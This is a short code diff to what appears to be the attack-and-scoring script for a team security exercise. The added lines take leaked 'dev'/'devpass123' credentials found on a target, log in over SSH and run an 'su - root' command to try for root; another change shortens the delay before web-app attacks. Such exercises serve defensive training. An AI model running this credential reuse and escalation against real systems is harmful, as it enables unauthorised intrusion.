@@ -119,6 +119,8 @@ def cred_attack(team_id):
 		if res.status_code == 200:
 			if "dev" in res.text and "devpass123" in res.text:
 				print("\033[31mteam", team_id, target + ":" + str(port) ,"has credential file: ", u,"\033[0m")
+				exploit = exploit = "echo root | su - root -c \"\""
+				m1_brute.sshc(team_id, target, port, "dev", "devpass123", exploit)
 			else:
 				add_score(team_id, 100) # クレデンシャル情報が流出したが、不正な通信がおこらなかった
 				print("team", team_id, target + ":" + str(port), "could not get hacked")
@@ -181,7 +183,7 @@ if __name__ == "__main__":
 		threading.Thread(target=cred_attack, args=(i,)).start()
 
 	# WEBアプリへの攻撃
-	sleep_until(60 * 4)
+	sleep_until(60 * 2)
 	# sleep_until(10)
 	print("====================================")
 	for i in range(1, 3):
